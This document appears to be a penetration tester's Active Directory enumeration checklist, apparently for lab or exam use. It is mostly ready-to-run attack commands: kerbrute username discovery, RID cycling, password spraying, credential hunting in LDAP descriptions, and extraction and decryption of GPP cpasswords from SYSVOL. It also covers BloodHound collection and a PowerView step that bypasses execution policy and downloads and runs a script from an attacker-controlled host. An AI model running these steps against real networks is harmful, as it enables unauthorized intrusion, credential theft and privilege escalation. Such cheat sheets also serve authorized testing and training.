# AD enumeration

## Before anything
nxc smb <DCIP>
- [ ] The domain and the DC's name from that line: <DCHost> and <Domain> added with host add, at the pwn-broker prompt
Kerberos refuses a clock more than five minutes off the DC's:
sudo ntpdate <DCIP>
- [ ] Shares, null sessions and RID cycling: :Pb smb
- [ ] The base DN and anonymous binds: :Pb ldap

## Users without a credential
At the pwn-broker prompt: tool install kerbrute. It only asks for tickets, so it locks no one out.
kerbrute userenum -d <Domain> --dc <DCIP> /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -o kerbrute.txt
grep 'VALID USERNAME' kerbrute.txt | awk '{print $7}' | cut -d '@' -f1 > users.txt
RID cycling over RPC, when nxc's guest login is refused:
impacket-lookupsid '<Domain>/guest@<DCIP>' -no-pass
impacket-lookupsid '<Domain>/guest@<DCIP>' -no-pass | grep SidTypeUser | cut -d ' ' -f2 | cut -d '\' -f2 >> users.txt
sort -u -o users.txt users.txt
- [ ] Anonymous LDAP answers: the users and their descriptions, from :Pb ldap
Staff names from the website, one First Last per line in names.txt, turned into candidates:
username-anarchy --input-file names.txt --select-format first,flast,first.last,firstl > candidates.txt
kerbrute userenum -d <Domain> --dc <DCIP> candidates.txt -o kerbrute.txt
- [ ] A user kerbrute says has no pre auth: :Pb asrep
- [ ] The lockout threshold from nxc smb <DCIP> -u '' -p '' --pass-pol before any spraying
Each username as its own password, once:
nxc smb <DCIP> -u users.txt -p users.txt --no-bruteforce --continue-on-success

## Check the credential
nxc smb <DCIP> -u '<Username>' -p '<Password>'
nxc smb <DCIP> -u '<Username>' -H '<Hash>'
nxc smb <DCIP> -u '<Username>' -p '<Password>' --pass-pol
- [ ] [+] means it is good, and every step below runs again for each new credential

## Quick wins with a credential
nxc ldap <DCIP> -u '<Username>' -p '<Password>' --users-export users.txt
nxc ldap <DCIP> -u '<Username>' -p '<Password>' -M get-desc-users
nxc ldap <DCIP> -u '<Username>' -p '<Password>' --password-not-required
nxc ldap <DCIP> -u '<Username>' -p '<Password>' --trusted-for-delegation
nxc ldap <DCIP> -u '<Username>' -p '<Password>' -M maq
nxc ldap <DCIP> -u '<Username>' -p '<Password>' -M laps
nxc ldap <DCIP> -u '<Username>' -p '<Password>' --gmsa
nxc ldap <DCIP> -u '<Username>' -p '<Password>' -M adcs
- [ ] A password in a description: a new credential, checked above
- [ ] Kerberoastable users: :Pb kerberoasting
- [ ] Delegation other than on the DCs
- [ ] A CA, for certipy find
Every user, group and computer as sortable pages, domain_users.html first:
ldapdomaindump -u '<Domain>\<Username>' -p '<Password>' -o ldd <DCIP>

## GPP passwords in SYSVOL
nxc smb <DCIP> -u '<Username>' -p '<Password>' -M gpp_password
nxc smb <DCIP> -u '<Username>' -p '<Password>' -M gpp_autologin
impacket-Get-GPPPassword '<Domain>/<Username>:<Password>@<DCHost>'
From a Windows shell, then the cpassword decrypted on Kali:
findstr /S /I cpassword \\<DCHost>\SYSVOL\<Domain>\Policies\*.xml
gpp-decrypt 'THE-CPASSWORD'
- [ ] A GPP password is often the local Administrator on many hosts: :Pb smb, where this credential works

## BloodHound collection
bloodhound-ce-python -u '<Username>' -p '<Password>' -d <Domain> -ns <DCIP> -c All --zip
bloodhound-ce-python -u '<Username>' --hashes ':<Hash>' -d <Domain> -ns <DCIP> -c All --zip
Faster on a big domain: tool install rusthound-ce, at the pwn-broker prompt.
rusthound-ce -d <Domain> -u '<Username>' -p '<Password>' -i <DCIP> -z
- [ ] bloodhound-ce-python for BloodHound CE: the older bloodhound-python writes a format CE will not ingest
- [ ] Collection fails: almost always DNS or the clock, from Before anything
- [ ] The zip uploaded under Administration, File Ingest
- [ ] Every account I hold marked Owned, then Shortest paths from Owned objects
- [ ] My own node's Outbound Object Control: :Pb acl-abuse
- [ ] Execution Privileges: where I have RDP, WinRM or local admin
- [ ] Kerberoastable, AS-REP roastable, unconstrained delegation and DCSync rights

## From a Windows shell
whoami /all
net user /domain
net group "Domain Admins" /domain
net accounts /domain
nltest /domain_trusts
PowerView, copied from /usr/share/windows-resources/powersploit/Recon/PowerView.ps1 into upload/ for serve:
powershell -ep bypass
iex (iwr -UseBasicParsing http://<LHOST>/PowerView.ps1)
Get-DomainUser -Properties samaccountname, description, memberof, pwdlastset | Format-Table
Get-DomainUser -SPN -Properties samaccountname, serviceprincipalname
Get-DomainUser -PreauthNotRequired -Properties samaccountname
Get-DomainGroupMember -Identity "Domain Admins" -Recurse | Select-Object MemberName
Get-DomainComputer -Properties name, dnshostname, operatingsystem
Find-InterestingDomainAcl -ResolveGUIDs | Select-Object ObjectDN, IdentityReferenceName, ActiveDirectoryRights
Find-LocalAdminAccess
Get-DomainTrust
- [ ] net group misses nested members: Get-DomainGroupMember -Recurse does not
- [ ] Defender eats PowerView: collect from Kali instead
Files on every share I can read: tool install snaffler, then Snaffler.exe through serve.
.\Snaffler.exe -s -d <Domain> -o snaffler.log
